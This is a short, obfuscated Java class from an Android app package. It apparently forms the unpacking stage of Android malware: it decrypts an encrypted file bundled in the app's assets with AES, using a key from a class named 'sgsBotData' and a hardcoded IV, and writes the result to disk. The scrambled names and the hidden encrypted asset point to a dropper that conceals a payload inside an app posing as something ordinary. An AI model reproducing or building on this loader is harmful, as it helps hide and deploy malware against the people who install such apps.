package com.makelist.market.slytherin36;

import android.content.Context;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.makelist.market.slytherin36.sgsBotData;

public class Fpetojgwj {
    public static void asncjwhqcxzw(Context asdwvzx, String cawwcv, String sswczs) {
        String sadw = sgsBotData.sadw;

        try {

            Cipher daswcc = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec asaswq = new SecretKeySpec(sadw.getBytes(), "AES");

            IvParameterSpec ghasfw = new IvParameterSpec("1234567812345678".getBytes());
            daswcc.init(Cipher.DECRYPT_MODE, asaswq, ghasfw);

            InputStream ss = asdwvzx.getAssets().open(cawwcv);

            OutputStream dasdwqg = new FileOutputStream(sswczs);

            CipherOutputStream okas = new CipherOutputStream(dasdwqg, daswcc);
            byte[] iwjv = new byte[1024];
            int r;
            while ((r = ss.read(iwjv)) >= 0) {
                System.out.println();
                okas.write(iwjv, 0, r);
            }

            okas.close();
            dasdwqg.close();
            ss.close();
        }catch (Exception dwwf){
            dwwf.printStackTrace();
        }
    }

}